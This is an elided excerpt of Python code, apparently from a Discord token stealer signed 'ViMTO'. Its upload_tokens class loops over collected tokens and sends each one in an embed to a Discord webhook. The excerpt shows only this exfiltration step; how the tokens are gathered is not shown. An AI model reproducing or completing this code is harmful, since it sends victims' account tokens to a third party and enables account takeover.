...
class upload_tokens:
    ...
    def upload(self):
        ...
        for token in self.tokens:
            ...
            embed.set_footer(text="ViMTO#0001")

            self.webhook.send(embed=embed, username="ViMTO", avatar_url="https://media.discordapp.net/attachments/1047639013449801830/1047646990990843914/eb53a885d052fa0093641aac259311b7.png")